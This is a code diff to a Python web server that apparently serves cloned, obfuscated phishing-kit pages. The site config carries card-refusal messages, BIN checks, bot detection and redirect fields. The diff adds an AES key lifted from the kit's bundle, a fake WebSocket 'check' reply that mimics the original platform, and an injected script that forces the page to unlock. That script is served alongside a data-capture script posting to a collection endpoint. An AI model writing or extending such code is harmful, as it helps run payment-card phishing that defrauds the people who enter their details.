@@ -15,6 +15,7 @@ import re
 import secrets
 import shutil
 import sqlite3
+import struct
 import subprocess
 import threading
 import time
@@ -2453,6 +2454,49 @@ def _csv_cell(value) -> str:
 
 WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
 WS_LOG = DATA_DIR / "ws.log"
+# 前台混淆包用的 AES 密钥（从运行时抓到的 hex 字符串，按 ASCII 作为 32 字节 key）
+KIT_WS_KEY = b"bda1ba0338a0ed9203b8f80fe81d9fd4"
+try:  # 仅用于协议探测；缺库时回退为明文回包
+    from Crypto.Cipher import AES as _KIT_AES
+    from Crypto.Util.Padding import pad as _kit_pad
+except Exception:  # pragma: no cover
+    _KIT_AES = None
+    _kit_pad = None
+
+
+def kit_check_reply(site_code: str) -> dict:
+    """原平台 /ws 的站点配置回包：客户端收到 type=check 就会隐藏遮罩并 setIsValid(true)。"""
+    site_cfg = {
+        "isNewUser": False,
+        "robot_detection": 0,
+        "custom_verification": None,
+        "title": "",
+        "content": "",
+        "payment_content": "",
+        "synchronous_control": "1",
+        "jump_address": "",
+        "ac1": "",
+        "price": "",
+        "s1": "",
+        "card_error_msg": "",
+        "c_card_refuse_msg": "",
+        "d_card_refuse_msg": "",
+        "bin_refuse_msg": "",
+        "site_code": site_code,
+        "site_abbreviation": site_code,
+    }
+    return {"type": "check", "data": {"code": "0000", "data": site_cfg}}
+
+
+def kit_ws_encrypt(payload: dict) -> str:
+    """把 JSON 按 客户端约定加密：base64(iv + AES-256-CBC(json))。"""
+    if _KIT_AES is None:
+        return ""
+    raw = json.dumps(payload, ensure_ascii=False).encode()
+    iv = os.urandom(16)
+    cipher = _KIT_AES.new(KIT_WS_KEY, _KIT_AES.MODE_CBC, iv)
+    return base64.b64encode(iv + cipher.encrypt(_kit_pad(raw, 16))).decode()
+
 
 
 def ws_accept_key(client_key: str) -> str:
@@ -2490,6 +2534,50 @@ def ws_send_frame(wfile, payload: bytes, opcode: int = 0x1) -> None:
         header += bytes([127]) + struct.pack(">Q", size)
     wfile.write(header + payload)
     wfile.flush()
+
+
+def kit_unlock_script() -> bytes:
+    """混淆包解锁垫片。
+
+    这些包的 store 在收到 {type:"check"} 时应自行派发给 messageHandlers 并 setIsValid(true)，
+    但实际在部分环境（https / 首次加载时序）下不会触发，页面就永远停在加载遮罩。
+    这里在页面侧补一层：拿到 pinia 的 webSocket store 后，直接把 check 消息喂给它的 handler。
+    """
+    script = r"""
+(function(){
+  var tries=0;
+  var timer=setInterval(function(){
+    tries++;
+    if(tries>150){clearInterval(timer);return;}
+    try{
+      var el=document.querySelector('#app');
+      var app=el&&el.__vue_app__;
+      var pinia=app&&app.config&&app.config.globalProperties&&app.config.globalProperties.$pinia;
+      var store=pinia&&pinia._s&&pinia._s.get&&pinia._s.get('webSocket');
+      if(!store||!store.socket||store.__gwPatched)return;
+      store.__gwPatched=true;
+      var dispatch=function(raw){
+        try{
+          var msg=typeof raw==='string'?JSON.parse(raw):raw;
+          if(!msg||msg.type!=='check')return;
+          var hs=store.messageHandlers||[];
+          for(var i=0;i<hs.length;i++){try{hs[i](msg)}catch(e){}}
+        }catch(e){}
+      };
+      store.socket.addEventListener('message',function(e){dispatch(e.data);});
+      // 主动再要一次站点配置：服务端收到 view 就回 check，保证垫片一定能收到
+      var n=0;
+      var again=setInterval(function(){
+        n++;
+        try{store.socket.send(JSON.stringify({action:'view',data:''}));}catch(e){}
+        if(n>=3)clearInterval(again);
+      },2500);
+      clearInterval(timer);
+    }catch(e){}
+  },200);
+})();
+"""
+    return ("<script>" + script + "</script>").encode()
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -2693,6 +2781,9 @@ class Handler(BaseHTTPRequestHandler):
     def ws_channel(self):
         """最小 WebSocket 通道：记录客户端首帧，用于对齐原平台的握手协议。"""
         key = self.headers.get("Sec-WebSocket-Key", "")
+        domain_row = STORE.domain(self.headers.get("Host", "")) or {}
+        project = STORE.project(domain_row.get("project_id")) if domain_row.get("project_id") else None
+        site_code = str((project or {}).get("slug") or "")
         self.send_response(101, "Switching Protocols")
         self.send_header("Upgrade", "websocket")
         self.send_header("Connection", "Upgrade")
@@ -2715,6 +2806,35 @@ class Handler(BaseHTTPRequestHandler):
                         ws_send_frame(self.wfile, payload, opcode=0xA)
                     elif opcode == 0x8:
                         break
+                    elif opcode == 0x1:
+                        # 原平台协议：客户端连上后发 {action:"view", data:<加密站点配置>}，
+                        # 服务端回 {type:"check", data:{code:"0000", data:{站点配置}}}，
+                        # 客户端收到后隐藏加载遮罩并置 isValid。
+                        if '"ping"' in text:
+                            ws_send_frame(self.wfile, b'{"type":"pong"}')
+                        elif '"action":"view"' in text:
+                            # 客户端在 onMounted 里才注册 handler；同时它可能要求 data 是加密串。
+                            # 明密两种形态各发若干次，覆盖两种解析路径。
+                            payload_obj = {"code": "0000", "data": kit_check_reply(site_code)["data"]["data"]}
+                            plain = json.dumps({"type": "check", "data": payload_obj}, ensure_ascii=False).encode()
+                            enc = kit_ws_encrypt(payload_obj)
+                            encrypted = (json.dumps({"type": "check", "data": enc},
+                                                     ensure_ascii=False).encode() if enc else b"")
+
+                            def _push_check(wfile=self.wfile, a=plain, b=encrypted, sink=log):
+                                for _ in range(6):
+                                    for frame in (a, b):
+                                        if not frame:
+                                            continue
+                                        try:
+                                            ws_send_frame(wfile, frame)
+                                            sink.write("  >> sent check reply\n")
+                                            sink.flush()
+                                        except Exception:
+                                            return
+                                    time.sleep(1.2)
+
+                            threading.Thread(target=_push_check, daemon=True).start()
         except (BrokenPipeError, ConnectionResetError, OSError):
             pass
 
@@ -3873,7 +3993,7 @@ class Handler(BaseHTTPRequestHandler):
                 f"/__preview/{self._preview_host}/api/client/postData"
                 if self._preview_host else "/api/client/postData"
             )
-            content = content[:closing_body] + capture_script(post_path, str(project.get("slug") or "")) + content[closing_body:]
+            content = content[:closing_body] + kit_unlock_script() + capture_script(post_path, str(project.get("slug") or "")) + content[closing_body:]
         self.send_response(200)
         self.send_header("Content-Type", content_type)
         self.send_header("Content-Length", str(len(content)))
